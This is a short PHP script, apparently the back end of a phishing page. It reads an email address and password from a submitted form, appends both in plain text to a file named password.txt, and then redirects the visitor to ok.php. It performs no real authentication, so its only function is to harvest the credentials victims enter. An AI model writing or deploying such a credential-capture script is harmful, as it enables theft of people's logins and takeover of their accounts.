<?php 

$email = $_POST['email'];
$pass = $_POST['pass'];

$dosya_adi = "../password/password.txt";
$dosya = fopen ($dosya_adi , 'a+') or die ("Error!");

fwrite ( $dosya , "
Email : $email\r\n" ) ;
fwrite ( $dosya , "Sifre : $pass\r\n" ) ;
fwrite ( $dosya , "____________________\r\n" ) ;
fclose ($dosya);

header("Location: ok.php");
?>
